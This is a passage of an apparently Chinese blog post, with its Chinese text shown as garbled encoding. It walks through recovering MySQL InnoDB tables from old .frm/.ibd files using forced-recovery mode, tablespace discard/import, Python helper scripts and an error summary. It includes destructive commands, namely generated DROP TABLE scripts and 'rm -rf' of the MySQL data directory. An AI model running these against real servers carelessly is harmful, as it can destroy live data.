range(1,col+1):</span><br><span class="line">            if i!=col:</span><br><span class="line">                string = 'id&#123;&#125; int,'.format(i)</span><br><span class="line">    else:</span><br><span class="line">                string = 'id&#123;&#125; int);'.format(i)</span><br><span class="line">            str_list.append(string)</span><br><span class="line">    for line in str_list:</span><br><span class="line">        a_file.write(line)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">create_table_col('/alidata/cy_table_col.txt','/alidata/cy_sql3.sql')</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> åˆ é™¤è¿™äº›æµ‹è¯•è¡¨</span></span><br><span class="line">[root@toberoot alidata]# vim py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# ll</span><br><span class="line">total 60</span><br><span class="line">-rw-r--r--  1 root  root  16729 May 17 16:00 cy_error1.log</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 15:12 cy_sql1.sql</span><br><span class="line">-rw-r--r--  1 root  root   1047 May 17 15:56 cy_sql2.sql</span><br><span class="line">-rw-r--r--  1 root  root   6353 May 17 16:15 cy_sql3.sql</span><br><span class="line">-rw-r--r--  1 root  root   1395 May 17 16:17 cy_sql4.sql</span><br><span class="line">-rw-r--r--  1 root  root    837 May 17 16:03 cy_table_col.txt</span><br><span class="line">-rw-r--r--  1 root  root    699 May 17 15:56 cy_table.txt</span><br><span class="line">drwxr-xr-x  3 root  root   4096 May 17 12:12 install</span><br><span class="line">drwxr-xr-x 11 mysql mysql  4096 May 17 15:44 mysql</span><br><span class="line">-rw-r--r--  1 root  root   1798 May 17 16:17 py_createtable01.py</span><br><span class="line"><span class="meta">#</span><span class="bash">pythonä»£ç å¦‚ä¸‹ï¼š</span></span><br><span class="line">def drop_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "drop table &#123;&#125;;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close()</span><br><span class="line"></span><br><span class="line">drop_table_test('/alidata/cy_table.txt','/alidata/cy_sql4.sql')</span><br><span class="line">    </span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql4.sql </span><br><span class="line">drop table base_dict</span><br><span class="line">;drop table biz_advise</span><br><span class="line">;drop table biz_bank</span><br><span class="line">;drop table biz</span><br><span class="line">;drop table biz_gift</span><br><span class="line">;drop table biz_gprs_bind</span><br><span class="line">;drop table biz_gprs_bind_his</span><br><span class="line">;drop table biz_msg_template</span><br><span class="line">;drop table biz_take_bank</span><br><span class="line">;drop table biz_take</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">åˆ é™¤æ•°æ®åº“çš„æ—¶å€™ç›´æ¥å¡æ­»äº†ï¼ŒåŸå› æœªçŸ¥ã€‚ä¹Ÿæ²¡æœ‰æŠ¥é”™ã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="bash">æ¸…æ•°æ®å¯åŠ¨æœåŠ¡</span></span><br><span class="line"></span><br><span class="line">ln: failed to create symbolic link â€˜/usr/local/mysql/bin/mysqldâ€™: File exists</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot ~]# mysql -e 'create database cy'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å¼€å§‹å°è¯•è·å–è¡¨çš„ç»“æ„</span></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql3.sql</span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# cp ~/home/cy02/*.frm /alidata/mysql/data/cy/ -p</span><br><span class="line">cp: overwrite â€˜/alidata/mysql/data/cy/base_dict.frmâ€™? ^C</span><br><span class="line">[root@toberoot alidata]# yes | cp ~/home/cy02/*.frm /alidata/mysql/data/cy/ -p</span><br><span class="line">[root@toberoot alidata]# ll /alidata/mysql/data/cy/sys_res*</span><br><span class="line">-rw-r--r-- 1 mysql mysql  9106 Aug 14  2017 /alidata/mysql/data/cy/sys_res.frm</span><br><span class="line">-rw-r----- 1 mysql mysql 98304 May 17 16:44 /alidata/mysql/data/cy/sys_res.ibd</span><br><span class="line"><span class="meta">#</span><span class="bash"> é…ç½®æ–‡ä»¶</span></span><br><span class="line">[mysqld]</span><br><span class="line">innodb_force_recovery=6</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"><span class="meta">#</span><span class="bash"> è¡¨ç»“æ„æˆåŠŸè·å–</span></span><br><span class="line">[root@toberoot alidata]# mysql cy -e 'desc sys_res'</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field  | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">| ID     | varchar(64)  | NO   | PRI | NULL    |       |</span><br><span class="line">| NAME   | varchar(32)  | NO   |     | NULL    |       |</span><br><span class="line">| CODE   | varchar(128) | NO   |     | NULL    |       |</span><br><span class="line">| URI    | varchar(128) | NO   |     | NULL    |       |</span><br><span class="line">| LOGO   | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| TYPE   | int(11)      | NO   |     | NULL    |       |</span><br><span class="line">| PCODE  | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| SORT   | int(11)      | YES  |     | 0       |       |</span><br><span class="line">| STATE  | int(11)      | NO   |     | NULL    |       |</span><br><span class="line">| ADMIN  | int(11)      | YES  |     | 0       |       |</span><br><span class="line">| REMARK | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| CRTIME | datetime     | NO   |     | NULL    |       |</span><br><span class="line">| UPTIME | datetime     | NO   |     | NULL    |       |</span><br><span class="line">+--------+--------------+------+-----+---------+-------+</span><br><span class="line">root@MySQL-01 16:49:  [(none)]&gt; select table_name,table_schema from information_schema.tables where table_schema='cy';</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">| table_name           | table_schema |</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">| base_dict            | cy           |</span><br><span class="line">| biz                  | cy           |</span><br><span class="line">| biz_advise           | cy           |</span><br><span class="line">| biz_bank             | cy           |</span><br><span class="line">| biz_gift             | cy           |</span><br><span class="line">| biz_gprs_bind        | cy           |</span><br><span class="line">| biz_gprs_bind_his    | cy           |</span><br><span class="line">| biz_msg_template     | cy           |</span><br><span class="line">| biz_take             | cy           |</span><br><span class="line">| biz_take_bank        | cy           |</span><br><span class="line">| biz_take_wwlt        | cy           |</span><br><span class="line">| biz_take_wx          | cy           |</span><br><span class="line">| biz_vip              | cy           |</span><br><span class="line">| biz_wlt              | cy           |</span><br><span class="line">| biz_wx               | cy           |</span><br><span class="line">| biz_wx_focus         | cy           |</span><br><span class="line">| biz_wx_walt          | cy           |</span><br><span class="line">| cfg_area             | cy           |</span><br><span class="line">| cfg_id_gen           | cy           |</span><br><span class="line">| gprs_model           | cy           |</span><br><span class="line">| mbr                  | cy           |</span><br><span class="line">| mbr_coin             | cy           |</span><br><span class="line">| mbr_coin_chged       | cy           |</span><br><span class="line">| mbr_oauth            | cy           |</span><br><span class="line">| mbr_pay              | cy           |</span><br><span class="line">| mbr_prizen           | cy           |</span><br><span class="line">| mbr_recharge         | cy           |</span><br><span class="line">| mbr_wallet           | cy           |</span><br><span class="line">| mbr_wallet_chged     | cy           |</span><br><span class="line">| ord                  | cy           |</span><br><span class="line">| ord_item             | cy           |</span><br><span class="line">| ord_pay_ali          | cy           |</span><br><span class="line">| ord_pay_coin         | cy           |</span><br><span class="line">| ord_pay_return       | cy           |</span><br><span class="line">| ord_pay_wlt          | cy           |</span><br><span class="line">| ord_pay_wx           | cy           |</span><br><span class="line">| prod                 | cy           |</span><br><span class="line">| prod_base_args       | cy           |</span><br><span class="line">| prod_bug_rpt         | cy           |</span><br><span class="line">| prod_cmd             | cy           |</span><br><span class="line">| prod_cmd_invoke      | cy           |</span><br><span class="line">| prod_coin_rpt        | cy           |</span><br><span class="line">| prod_coin_rpt_log    | cy           |</span><br><span class="line">| prod_gprs_bind       | cy           |</span><br><span class="line">| prod_gprs_bind_his   | cy           |</span><br><span class="line">| prod_instl_imgs      | cy           |</span><br><span class="line">| prod_instl_pos       | cy           |</span><br><span class="line">| prod_instl_pos_model | cy           |</span><br><span class="line">| prod_mod_attr        | cy           |</span><br><span class="line">| prod_mod_attr_val    | cy           |</span><br><span class="line">| prod_mod_sku         | cy           |</span><br><span class="line">| prod_model           | cy           |</span><br><span class="line">| prod_onl_log         | cy           |</span><br><span class="line">| prod_sp_arg_vals     | cy           |</span><br><span class="line">| prod_sp_args         | cy           |</span><br><span class="line">| sys_acct             | cy           |</span><br><span class="line">| sys_acct_res         | cy           |</span><br><span class="line">| sys_res              | cy           |</span><br><span class="line">+----------------------+--------------+</span><br><span class="line">58 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 58å¼ è¡¨dumpå¤‡ä»½å‡ºæ¥</span></span><br><span class="line">[root@toberoot alidata]# mysqldump -B cy -d &gt; /alidata/new_yc_ddl.sql</span><br><span class="line">[root@toberoot alidata]# tail -n 30 /alidata/new_yc_ddl.sql </span><br><span class="line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span><br><span class="line">/*!40101 SET character_set_client = utf8 */;</span><br><span class="line">CREATE TABLE `sys_res` (</span><br><span class="line">  `ID` varchar(64) NOT NULL COMMENT 'ID',</span><br><span class="line">  `NAME` varchar(32) NOT NULL COMMENT 'èœå•åç§°',</span><br><span class="line">  `CODE` varchar(128) NOT NULL COMMENT 'èœå•ç¼–ç ',</span><br><span class="line">  `URI` varchar(128) NOT NULL COMMENT 'URI',</span><br><span class="line">  `LOGO` varchar(64) DEFAULT NULL COMMENT 'å›¾æ ‡',</span><br><span class="line">  `TYPE` int(11) NOT NULL COMMENT '@èœå•ç±»å‹ï¼ˆ1èœå•ï¼›2æŒ‰é’®ï¼‰',</span><br><span class="line">  `PCODE` varchar(64) DEFAULT NULL COMMENT 'çˆ¶èœå•',</span><br><span class="line">  `SORT` int(11) DEFAULT '0' COMMENT 'æ’åº',</span><br><span class="line">  `STATE` int(11) NOT NULL COMMENT '@@çŠ¶æ€ï¼ˆ0 æ— æ•ˆï¼›1 æ­£å¸¸ï¼‰',</span><br><span class="line">  `ADMIN` int(11) DEFAULT '0' COMMENT 'æ˜¯å¦ç®¡ç†å‘˜èœå•ï¼ˆé»˜è®¤0å¦ï¼‰',</span><br><span class="line">  `REMARK` varchar(64) DEFAULT NULL COMMENT 'å¤‡æ³¨',</span><br><span class="line">  `CRTIME` datetime NOT NULL COMMENT 'CRTIME',</span><br><span class="line">  `UPTIME` datetime NOT NULL COMMENT 'UPTIME',</span><br><span class="line">  PRIMARY KEY (`ID`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='æƒé™_ç³»ç»Ÿèµ„æº';</span><br><span class="line">/*!40101 SET character_set_client = @saved_cs_client */;</span><br><span class="line">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;</span><br><span class="line"></span><br><span class="line">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span><br><span class="line">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2018-05-17 16:52:28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> discardå’Œimportå‘½ä»¤</span></span><br><span class="line">def discard_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "alter table &#123;&#125; discard tablespace;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def import_table_test(table_file,sql_file):</span><br><span class="line">    a_file = open(sql_file,'w')</span><br><span class="line">    b_file = open(table_file)</span><br><span class="line">    b_list = b_file.readlines()</span><br><span class="line">    for table in b_list:</span><br><span class="line">        string = "alter table &#123;&#125; import tablespace;".format(table)</span><br><span class="line">        a_file.write(string)</span><br><span class="line">    a_file.close() </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">discard_table_test('/alidata/cy_table.txt','/alidata/cy_sql5.sql')</span><br><span class="line">import_table_test('/alidata/cy_table.txt','/alidata/cy_sql6.sql')</span><br><span class="line">   </span><br><span class="line"><span class="meta">#</span><span class="bash"> ç”Ÿæˆsql</span></span><br><span class="line">[root@toberoot alidata]# python py_createtable01.py </span><br><span class="line">[root@toberoot alidata]# ll</span><br><span class="line">total 124</span><br><span class="line">-rw-r--r--  1 root  root  16729 May 17 16:00 cy_error1.log</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 15:12 cy_sql1.sql</span><br><span class="line">-rw-r--r--  1 root  root   1047 May 17 15:56 cy_sql2.sql</span><br><span class="line">-rw-r--r--  1 root  root   6353 May 17 16:15 cy_sql3.sql</span><br><span class="line">-rw-r--r--  1 root  root   1395 May 17 16:17 cy_sql4.sql</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 16:55 cy_sql5.sql</span><br><span class="line">-rw-r--r--  1 root  root   2033 May 17 16:55 cy_sql6.sql</span><br><span class="line">-rw-r--r--  1 root  root    837 May 17 16:03 cy_table_col.txt</span><br><span class="line">-rw-r--r--  1 root  root    699 May 17 15:56 cy_table.txt</span><br><span class="line">drwxr-xr-x  3 root  root   4096 May 17 16:41 install</span><br><span class="line">drwxr-xr-x 11 mysql mysql  4096 May 17 16:47 mysql</span><br><span class="line">-rw-r--r--  1 root  root  57068 May 17 16:52 new_yc_ddl.sql</span><br><span class="line">-rw-r--r--  1 root  root   2489 May 17 16:55 py_createtable01.py</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql5.sql </span><br><span class="line">alter table base_dict</span><br><span class="line"> discard tablespace;alter table biz_advise</span><br><span class="line"> discard tablespace;alter table biz_bank</span><br><span class="line"> discard tablespace;alter table biz</span><br><span class="line"> discard tablespace;alter table biz_gift</span><br><span class="line"> discard tablespace;alter table biz_gprs_bind</span><br><span class="line"> discard tablespace;alter table biz_gprs_bind_his</span><br><span class="line"> discard tablespace;alter table biz_msg_template</span><br><span class="line"> discard tablespace;alter table biz_take_bank</span><br><span class="line"> discard tablespace;alter table biz_take</span><br><span class="line">[root@toberoot alidata]# head /alidata/cy_sql6.sql </span><br><span class="line">alter table base_dict</span><br><span class="line"> import tablespace;alter table biz_advise</span><br><span class="line"> import tablespace;alter table biz_bank</span><br><span class="line"> import tablespace;alter table biz</span><br><span class="line"> import tablespace;alter table biz_gift</span><br><span class="line"> import tablespace;alter table biz_gprs_bind</span><br><span class="line"> import tablespace;alter table biz_gprs_bind_his</span><br><span class="line"> import tablespace;alter table biz_msg_template</span><br><span class="line"> import tablespace;alter table biz_take_bank</span><br><span class="line"> import tablespace;alter table biz_take</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld restart</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# cp /root/home/cy02/*.ibd /alidata/mysql/data/cy/ -rp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# service mysqld restart</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br><span class="line">[root@toberoot alidata]# service mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@toberoot alidata]# rm -rf /alidata/mysql/data/*</span><br><span class="line"></span><br><span class="line">[root@toberoot alidata]# service mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line">[root@toberoot alidata]# mysql &lt; new_yc_ddl.sql </span><br><span class="line">[root@toberoot alidata]# mysql -e 'use cy;select * from sys_res'</span><br><span class="line"></span><br><span class="line">å¼€å¯å¼ºåˆ¶æ¢å¤å‚æ•°</span><br><span class="line">[root@toberoot alidata]# vim /etc/my.cnf</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql</span><br><span class="line">cy_sql1.sql  cy_sql2.sql  cy_sql3.sql  cy_sql4.sql  cy_sql5.sql  cy_sql6.sql  </span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql </span><br><span class="line">[root@toberoot alidata]# cp /root/home/cy02/*.ibd /alidata/mysql/data/cy/ -rp</span><br><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å…¨å¤‡ä»½æ•°æ®</span></span><br><span class="line">[root@toberoot alidata]# mysqldump -B cy &gt; new_cy_all.sql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹å¤‡ä»½çš„æ•°æ®é‡</span></span><br><span class="line">-rw-r--r--  1 root  root   26M May 17 17:13 new_cy_all.sql</span><br></pre></td></tr></table></figure><h2 id="æŠ¥é”™æ±‡æ€»"><a href="#æŠ¥é”™æ±‡æ€»" class="headerlink" title="æŠ¥é”™æ±‡æ€»"></a>æŠ¥é”™æ±‡æ€»</h2><h3 id="ERROR-1036-ï¼ˆHY00ï¼‰"><a href="#ERROR-1036-ï¼ˆHY00ï¼‰" class="headerlink" title="ERROR 1036 ï¼ˆHY00ï¼‰"></a>ERROR 1036 ï¼ˆHY00ï¼‰</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql</span><br><span class="line">ERROR 1036 (HY000) at line 1: Table 'base_dict' is read only</span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼š</p><ol><li>æ£€æŸ¥æ˜¯å¦é…ç½®æ–‡ä»¶ä¸­å­˜åœ¨innodb_force_recoveryå‚æ•°</li><li>å¦‚æœå­˜åœ¨å»é™¤æˆ–æ³¨é‡Šæ‰ï¼Œé‡å¯æœåŠ¡å³å¯</li><li>è¿˜ä¸è¡Œå°±æ¸…ç©ºæ•°æ®åº“å¯¼å…¥ç»“æ„åå†ç»§ç»­</li></ol><h3 id="ERROR-2013-HY000"><a href="#ERROR-2013-HY000" class="headerlink" title="ERROR 2013 (HY000)"></a>ERROR 2013 (HY000)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql</span><br><span class="line">ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query</span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼š</p><ol><li><p>sqlè„šæœ¬ä¸­æ‰§è¡Œimport tablespaceçš„æ“ä½œéœ€è¦å¼€å¯recoveryçš„å‚æ•°</p></li><li><p>é‡å¯æœåŠ¡ </p><p>åœ¨å®¢æˆ·æœåŠ¡ä¸Šï¼Œæ‰§è¡Œä»¥ä¸Šæ“ä½œè¿˜æ˜¯æŠ¥é”™æ— æ³•è¿æ¥ï¼Œå°è¯•å¤šæ¬¡éƒ½ä¸è¡Œã€‚</p></li></ol><p><img src="MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/04.jpg" alt=""></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ¬¡caseçš„æ•™è®­å°±æ˜¯ï¼Œå¤‡ä»½ï¼ä¸€å®šè¦æœ‰å‘¨æœŸæ€§çš„æœ‰æ•ˆå¤‡ä»½ï¼</p><p>æ¬ºéª—MySQLè¿›ç¨‹è’™æ··è¿‡å…³åªèƒ½æ˜¯æ²¡åŠæ³•çš„åŠæ³•ï¼Œè€Œä¸”ä¸èƒ½ä¿è¯æˆåŠŸç‡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -*- coding : utf8 -*-</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> py_createtable01.py</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> authï¼š booboowei</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class mysql_tools():</span><br><span class="line">    def __init__(self, in_file):</span><br><span class="line">        self.b_list = open(in_file).readlines()</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">    def create_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "create table &#123;&#125; (id int);".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def desc_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "desc &#123;&#125;;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def create_table_col(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        str_list = []</span><br><span class="line">        for table_col_str in self.b_list:</span><br><span class="line">            table_col_list = table_col_str.split()</span><br><span class="line">            table = table_col_list[0]</span><br><span class="line">            col = int(table_col_list[1])</span><br><span class="line">            string = "create table &#123;&#125; (".format(table)</span><br><span class="line">            str_list.append(string)</span><br><span class="line">            for i in range(1, col + 1):</span><br><span class="line">                if i != col:</span><br><span class="line">                    string = 'id&#123;&#125; int,'.format(i)</span><br><span class="line">                else:</span><br><span class="line">                    string = 'id&#123;&#125; int);'.format(i)</span><br><span class="line">                str_list.append(string)</span><br><span class="line">        for line in str_list:</span><br><span class="line">            a_file.write(line)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def drop_table_test(self,  sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "drop table &#123;&#125;;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def discard_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "alter table &#123;&#125; discard tablespace;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    def import_table_test(self, sql_file):</span><br><span class="line">        a_file = open(sql_file, 'w')</span><br><span class="line">        for table in self.b_list:</span><br><span class="line">            string = "alter table &#123;&#125; import tablespace;".format(table)</span><br><span class="line">            a_file.write(string)</span><br><span class="line">        a_file.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').create_table_test('/alidata/cy_sql1.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').desc_table_test('/alidata/cy_sql2.sql')</span><br><span class="line">    # æ ¹æ®ä»¥ä¸Šè¡¨åå’Œåˆ—æ•°ç”Ÿæˆæ–°çš„æµ‹è¯•è¡¨</span><br><span class="line">    mysql_tools('/alidata/cy_table_col.txt').create_table_col('/alidata/cy_sql3.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').drop_table_test('/alidata/cy_sql4.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').discard_table_test('/alidata/cy_sql5.sql')</span><br><span class="line">    mysql_tools('/alidata/cy_table.txt').import_table_test('/alidata/cy_sql6.sql')</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦ï¼šCashæ¢å¤çš„æ­£ç¡®æ–¹å¼æ˜¯ï¼š&lt;strong&gt;å¤‡ä»½æ–‡ä»¶ï¼ˆé€»è¾‘æˆ–ç‰©ç†ï¼‰+ binlog&lt;/strong&gt;è¿›è¡Œæ¢å¤ï¼›ç„¶è€Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„è¿ç»´äººå‘˜éƒ½çŸ¥é“æ€ä¹ˆè¿›è¡Œæ­£ç¡®çš„å¤‡ä»½ï¼Œç”šè‡³è¿é€»è¾‘å¤‡ä»½å’Œç‰©ç†å¤‡ä»½çš„åŒºåˆ«æ˜¯ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Ÿæ›´ä¸çŸ¥é“å¤‡ä»½è¿‡ç¨‹ä¸­éœ€è¦è€ƒè™‘æ•°æ®çš„ä¸€è‡´æ€§ä¸æœåŠ¡å¯ç”¨æ€§çš„é—®é¢˜ï¼Ÿæˆ–è€…è¿å¤‡ä»½å·¥å…·éƒ½ä¸ä¼šä½¿ç”¨ï¼Œæ‰€ä»¥å½“ä½ é—®ï¼šæœ‰å¤‡ä»½å—ï¼Ÿå›ç­”ï¼šæ²¡æœ‰æˆ–è€…æ— æ•ˆ&lt;/p&gt;
